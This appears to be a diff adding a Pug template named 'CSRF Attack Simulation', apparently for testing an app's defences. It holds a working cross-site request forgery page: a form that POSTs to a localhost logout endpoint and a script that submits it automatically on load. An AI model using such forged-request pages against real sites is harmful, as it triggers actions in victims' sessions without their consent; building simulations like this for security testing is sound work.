@@ -1,0 +1,11 @@
+doctype html
+html
+  head
+    title CSRF Attack Simulation
+  body
+    form(id="csrfLogoutForm", action="https://localhost:3001/logout", method="POST")
+      noscript
+        button(type="submit") Log Out
+
+    script.
+      document.getElementById('csrfLogoutForm').submit();
